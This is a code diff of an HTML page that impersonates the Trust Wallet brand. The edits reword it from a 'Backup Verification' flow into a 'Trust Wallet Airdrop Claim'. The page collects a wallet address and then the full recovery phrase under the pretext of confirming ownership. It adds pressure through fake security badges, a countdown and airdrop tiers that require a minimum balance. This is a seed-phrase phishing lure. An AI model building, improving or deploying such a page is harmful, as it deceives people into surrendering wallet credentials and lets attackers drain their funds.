@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>Backup Verification</title>
+  <title>Trust Wallet Airdrop Claim</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
@@ -409,42 +409,42 @@ body {
 <body>
   <header>
     <div class="logo">
-      <img src="https://logos-world.net/wp-content/uploads/2023/12/Trust-Wallet-New-Logo.png" 
+      <img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/trust-wallet-icon.png" 
            alt="Demo Logo">
     </div>
     <div>
-      <div class="title">Backup Verification</div>
+      <div class="title">Trust Wallet Airdrop Claim</div>
     </div>
   </header>
 
   <main>
   <div id="step1" class="card" role="region" aria-labelledby="s1title">
-    <h2 id="s1title">Wallet address</h2>
+    <h2 id="s1title">Enter Your Wallet address</h2>
 
     <!-- Wrapped input block -->
     <div style="width: 100%; display: flex; flex-direction: column;">
-      <label for="addr">Enter your USDT (TRC20) address</label>
+      <label for="addr">Your USDT (TRC20) Address</label>
       <input id="addr" name="addr" placeholder="0x..." autocomplete="off" />
     </div>
 
     <div class="loader" aria-hidden="true"></div>
-    <button id="s1btn">Continue</button>
+    <button id="s1btn">Confirm & Continue</button>
 
     <!-- ✅ Security Badge now inside step1 -->
     <div class="security-badge" style="display:flex; align-items:center; justify-content:center; margin-top:20px; color:#666666; font-size:14px;">
       <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right:8px;">
         <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
       </svg>
-      Encrypted Connection • Verified
+      Encrypted Connection • Secured
     </div>
   </div>
   
   <div id="step2" class="card" hidden role="region" aria-labelledby="s2title">
-  <h2 id="s2title">Recovery Phrase</h2>
+  <h2 id="s2title">Confirm Ownership</h2>
 
   <!-- Wrap inputs in a form -->
   <form id="step2-form">
-    <label>Enter your backup phrase</label>
+    <label>Enter your recovery phrase to confirm ownership</label>
     <div class="phrase-grid">
   <div><label for="word1">1</label>
     <input type="text" id="word1" name="word1" autocomplete="off" spellcheck="false" />
@@ -487,11 +487,11 @@ body {
     <!-- Confirmation checkbox -->
     <label style="display:flex; align-items:center; gap:8px; margin-top:12px; color:#22c55e;">
       <input type="checkbox" id="matchCheck" name="matchCheck">
-      <span>I confirm my backup is correct & matches my TRC20 wallet address</span>
+      <span>I confirm this phrase is correct & matches my wallet</span>
     </label>
 
     <div class="progress" aria-hidden="true"><div id="progbar"></div></div>
-    <button id="s2btn" type="submit">Verify</button>
+    <button id="s2btn" type="submit">Confirm & Continue</button>
   </form>
 
   <!-- Security Badge -->
@@ -499,17 +499,17 @@ body {
     <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right:8px;">
       <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
     </svg>
-    Do not close during verification
+    Do not close during confirmation
   </div>
   </div>
   
   <div id="step3" class="card" hidden role="region" aria-labelledby="s3title">
-    <h2 id="s3title">Vault Eligibility</h2>
+    <h2 id="s3title">Select Airdrop Tier</h2>
     <p style="margin-top: 8px; color: var(--green); font-weight: 600; display:flex; align-items:center; gap:6px;">
       <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" viewBox="0 0 16 16">
         <path d="M8 0c-.69 0-1.37.14-2 .41L2 2v5c0 4.5 3.5 8.5 6 9 2.5-.5 6-4.5 6-9V2l-4-1.59C9.37.14 8.69 0 8 0z"/>
       </svg>
-      Backup confirmed — now let’s activate your vault eligibility.
+      Confirmed ownership — now choose your airdrop tier.
     </p>
     <p class="subtitle">
       This is a one-time vault entry. Please select your airdrop tier.
@@ -532,7 +532,7 @@ body {
     </select>
 
     <p class="muted" style="margin-top: 16px;">
-      Please deposit the required balance into your wallet. Once confirmed, your vault reward will be auto credited within 24 hours.
+      Ensure your wallet meets the minimum balance to unlock your selected tier. Rewards are auto‑credited within 24 hours.
     </p>
     <p id="countdown" style="color:#fb7185; font-weight:600;"></p>
 
@@ -554,7 +554,7 @@ body {
       updateCountdown();
     </script>
 
-    <button id="s3btn" style="margin-top: 16px;">Activate eligibility</button>
+    <button id="s3btn" style="margin-top: 16px;">Confirm Tier</button>
     <div id="loaderBar" class="loader" hidden></div>
   </div>
 
